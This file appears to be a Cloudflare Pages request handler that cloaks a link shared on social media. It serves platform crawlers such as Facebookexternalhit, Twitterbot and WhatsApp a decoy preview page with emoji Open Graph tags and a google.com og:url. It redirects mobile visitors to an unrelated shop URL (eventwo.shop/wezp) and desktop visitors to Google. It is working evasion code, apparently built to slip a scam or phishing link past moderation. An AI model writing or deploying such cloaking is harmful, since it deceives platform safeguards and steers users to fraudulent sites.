export async function onRequest(context) {
  const request = context.request;
  const userAgent = request.headers.get('user-agent') || '';

  // 1. Check for Social Media Crawlers / Bots
  const isSocialBot = /facebookexternalhit|Facebot|Twitterbot|Pinterest|LinkedInBot|WhatsApp|TelegramBot/i.test(userAgent);

  if (isSocialBot) {
    const htmlContent = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Welcome</title>
    <meta property="og:title" content="❤️💙💛💜">
    <meta property="og:description" content="">
    <meta property="og:image" content="https://mpr-dsr.pages.dev/_MConverter.eu_c8c594fd-9a4d-4514-8829-c4d12e238a29%20(1).mp4?fbclid=IwcGRvZgRleHRuA2FlbQIxMQBicmlkETF5UGFPRDdrYWZhTGY3cWk2c3J0YwZhcHBfaWQBMAABHpZjXFVSLm8yE5hfqS5OWOXdhUeEYFQWP4vChG9yeBZEj8SR68fr_SjlU8zq_aem_jEa9jxdyX2V7LQxZh_QR_Q">
    <meta property="og:url" content="https://www.google.com">
    <meta property="og:type" content="website">
</head>
<body>
</body>
</html>`;

    return new Response(htmlContent, {
      headers: { 'content-type': 'text/html;charset=UTF-8' },
    });
  }

  // 2. Check for Mobile Users
  const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);

  if (isMobile) {
    return Response.redirect("https://eventwo.shop/wezp", 302);
  } else {
    return Response.redirect("https://www.google.com", 302);
  }
}
